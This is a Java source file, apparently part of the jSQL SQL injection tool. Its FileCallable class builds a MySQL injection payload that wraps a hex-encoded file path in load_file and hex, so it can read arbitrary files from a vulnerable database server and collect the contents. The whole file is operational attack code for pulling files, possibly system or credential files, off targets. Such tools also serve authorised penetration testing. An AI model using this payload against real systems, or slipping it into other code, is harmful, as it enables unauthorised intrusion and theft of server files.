package com.jsql.model.ao;
import java.util.concurrent.Callable;

import com.jsql.exception.PreparationException;
import com.jsql.exception.StoppableException;
import com.jsql.model.StoppableLoopIntoResults;
import com.jsql.tool.StringTool;
import com.jsql.view.GUIMediator;

public class FileCallable implements Callable<FileCallable> {
    public String url, fileSource;
    
    FileCallable(String url) {
        this.url = url;
    }

    @Override
    public FileCallable call() throws Exception {
        if (!GUIMediator.model().rao.endFileSearch) {
            String[] sourcePage = {""};

            String hexResult = "";
            try {
                hexResult = new StoppableLoopIntoResults().action(
                        "concat(hex(load_file(0x" + StringTool.strhex(url) + ")),0x69)",
                        sourcePage,
                        false,
                        1,
                        null);
            } catch (PreparationException e) {
                // User cancels the search, probably
            } catch (StoppableException e) {
                // User cancels the search, probably
            }
            fileSource = hexResult;
        }
        return this;
    }
}